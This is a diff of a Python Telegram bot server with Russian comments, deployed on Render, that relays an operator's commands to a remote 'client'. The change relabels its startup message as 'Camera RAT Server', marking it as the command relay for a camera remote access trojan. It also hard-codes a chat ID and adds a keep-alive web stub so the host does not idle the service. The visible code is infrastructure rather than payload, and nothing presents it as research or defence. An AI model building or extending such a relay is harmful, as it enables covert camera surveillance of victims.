@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Telegram Bot Server — работает на VDS
-Ретранслирует твои команды клиенту через Telegram
+Telegram Bot Server — работает на Render
+Ретранслирует твои команды через Telegram
 """
 
 import os
@@ -10,13 +10,16 @@ import time
 import requests
 import logging
 from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
 
 # ===== ТВОИ ДАННЫЕ =====
 BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Читаем секретный токен из панели Render
-CHAT_ID = "87228582929"
+CHAT_ID = "8722858929"                   # Твой обновленный правильный ID
 # =======================
 
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
 logging.basicConfig(
     level=logging.INFO,
     format='[%(asctime)s] %(message)s',
@@ -95,16 +98,12 @@ def handle_command(chat_id, text):
 
 def main():
     log("=" * 40)
-    log("Сервер запущен на Render")
+    log("Camera RAT Server запущен на Render")
     log(f"Chat ID: {CHAT_ID}")
     log("=" * 40)
     log("Ожидание команд в Telegram...")
     
     last_update_id = 0
-    
-    # Мы убрали жесткую блокирующую проверку, чтобы скрипт не падал при старте.
-    # Вместо этого просто пишем лог.
-    log("✅ Инициализация успешна, переходим к опросу Telegram...")
     
     while True:
         try:
@@ -140,10 +139,7 @@ def main():
             log(f"Ошибка в цикле обновлений: {e}")
             time.sleep(5)
 
-# Добавляем веб-сервер «заглушку» для Render, чтобы сервис не отключался
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import threading
-
+# Класс-заглушка для Render, чтобы сервис не засыпал
 class RenderHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -157,32 +153,8 @@ def run_health_check_server():
     server.serve_forever()
 
 if __name__ == "__main__":
-    # Запускаем веб-порт в отдельном потоке для проверки от Render
+    # 1. Запускаем веб-сервер в отдельном фоновом потоке для Render
     threading.Thread(target=run_health_check_server, daemon=True).start()
     
-    # Запускаем основную логику бота
+    # 2. Запускаем основную логику бота
     main()
-    # Класс-заглушка для Render, чтобы он видел рабочий веб-порт
-class WebStub(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(b"Server is running!")
-
-def run_web_server():
-    # Render автоматически передает порт в переменную окружения PORT
-    port = int(os.environ.get("PORT", 10000))
-    server = HTTPServer(("0.0.0.0", port), WebStub)
-    server.serve_forever()
-
-if __name__ == "__main__":
-    # Запускаем веб-сервер в отдельном потоке, чтобы он не мешал основному коду
-    threading.Thread(target=run_web_server, daemon=True).start()
-
-    # Здесь начинается твоя основная логика (например, отправка сообщений или цикл)
-    log("Ожидание команд в Telegram...")
-
-    # Бесконечный цикл, чтобы скрипт не завершал работу
-    while True:
-        time.sleep(10)
